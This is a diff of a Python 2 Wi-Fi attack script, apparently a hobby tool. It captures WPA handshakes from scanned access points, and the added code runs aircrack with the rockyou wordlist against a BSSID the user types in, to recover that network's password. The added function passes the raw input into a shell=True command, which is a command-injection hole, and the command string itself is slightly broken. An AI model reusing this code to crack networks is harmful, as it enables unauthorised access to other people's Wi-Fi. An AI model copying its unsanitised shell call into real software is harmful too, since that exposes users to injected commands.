@@ -81,7 +81,7 @@ def capture_handshake(bssid, interface_name):
             out += os.read(fd, 2048)
 
     poll.unregister(p.stderr)
-    
+
     #out2arr = out.split("\n")
     out2arr = out.split("\x1b[J\x1b[1;1H\n")
     #out2arr = out.split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")
@@ -168,7 +168,7 @@ def get_bssids(interface_name):
             data = line.split()
 
             bssid = {
-                    "BSSID": data[0], 
+                    "BSSID": data[0],
                     "Pwr": data[1],
                     "Beacons": data[2],
                     "Data": data[3],
@@ -215,6 +215,11 @@ def get_bssids(interface_name):
         time.sleep(1)
     """
 
+    def crack_password(bssid):
+        cmd = "aircrack -w rockyou.txt -b" + bssid + " captured_packet_file_name.cap"
+        subprocess.call(cmd, shell=True)
+
+
 def run():
     check_root()
     os.system("rm testcap*")
@@ -226,5 +231,8 @@ def run():
         time.sleep(1)
         reset_network(interface)
 
-if __name__ == "__main__": 
+    bssid = raw_input("Which bssid do want the password for? ")
+    crack_password(bssid)
+
+if __name__ == "__main__":
     run()
